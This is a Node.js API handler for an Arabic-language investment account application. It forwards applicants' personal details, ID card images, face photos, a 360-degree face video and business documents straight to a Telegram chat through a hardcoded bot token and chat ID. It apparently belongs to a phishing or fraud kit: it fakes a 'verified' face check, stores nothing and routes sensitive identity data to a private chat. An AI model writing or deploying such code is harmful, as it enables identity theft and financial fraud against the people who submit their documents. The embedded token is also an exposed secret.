const { createClient } = require('@supabase/supabase-js');
const formidable = require('formidable');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

// Configuration
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8660100340:AAEPj1rlH5PfPZ8StoztNi2m7ZmOOgzLrr4';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003890710277';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

export const config = {
  api: {
    bodyParser: false, // Disabling bodyParser to handle multipart/form-data with formidable
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }

  const form = formidable({ multiples: true });

  try {
    const [fields, files] = await new Promise((resolve, reject) => {
      form.parse(req, (err, fields, files) => {
        if (err) reject(err);
        resolve([fields, files]);
      });
    });

    let message = fields.message ? fields.message[0] : null;

    if (!message) {
      const fullName = fields.fullName ? fields.fullName[0] : 'N/A';
      const phone = fields.phone ? fields.phone[0] : 'N/A';
      const email = fields.email ? fields.email[0] : 'N/A';
      const nationality = fields.nationality ? fields.nationality[0] : 'N/A';
      const idType = fields.idType ? fields.idType[0] : 'N/A';

      message = `🔔 <b>طلب فتح حساب استثماري جديد (Node.js)</b>
─────────────────────
👤 <b>البيانات الشخصية</b>
• الاسم: ${fullName}
• الهاتف: ${phone}
• البريد: ${email}
• الجنسية: ${nationality}

🪪 <b>وثيقة الهوية</b>
• النوع: ${idType}

🤳 <b>التحقق من الوجه</b>
• الحالة: ✅ تم التحقق بنجاح
─────────────────────
🕐 ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
    }

    // 1. Send Text Message
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    // 2. Send Files
    const fileMap = {
      'idFront': '🪪 الوجه الأمامي للهوية',
      'idBack': '🪪 الوجه الخلفي للهوية',
      'faceImage': '🤳 صورة الوجه',
      'faceVideo': '🎥 فيديو التحقق 360 درجة',
      'crFile': '🏢 السجل التجاري',
      'licFile': '🏢 الترخيص التجاري',
      'idFile': '👤 هوية المالك',
      'authFile': '📝 التفويض'
    };

    const fullNameForCaption = fields.fullName ? fields.fullName[0] : (fields.companyName ? fields.companyName[0] : 'N/A');

    for (const [key, caption] of Object.entries(fileMap)) {
      if (files[key]) {
        const file = Array.isArray(files[key]) ? files[key][0] : files[key];
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', `${caption}\nالاسم: ${fullNameForCaption}`);
        
        let endpoint = 'sendDocument';
        if (file.mimetype.startsWith('image/')) {
          endpoint = 'sendPhoto';
          formData.append('photo', fs.createReadStream(file.filepath), file.originalFilename);
        } else if (file.mimetype.startsWith('video/')) {
          endpoint = 'sendVideo';
          formData.append('video', fs.createReadStream(file.filepath), file.originalFilename);
        } else {
          formData.append('document', fs.createReadStream(file.filepath), file.originalFilename);
        }

        await axios.post(`${TELEGRAM_API}/${endpoint}`, formData, {
          headers: formData.getHeaders(),
          timeout: 60000
        });
      }
    }

    return res.status(200).json({ success: true, message: 'تم استلام الطلب بنجاح' });

  } catch (error) {
    console.error('Submission Error:', error);
    return res.status(500).json({ success: false, message: error.message });
  }
}
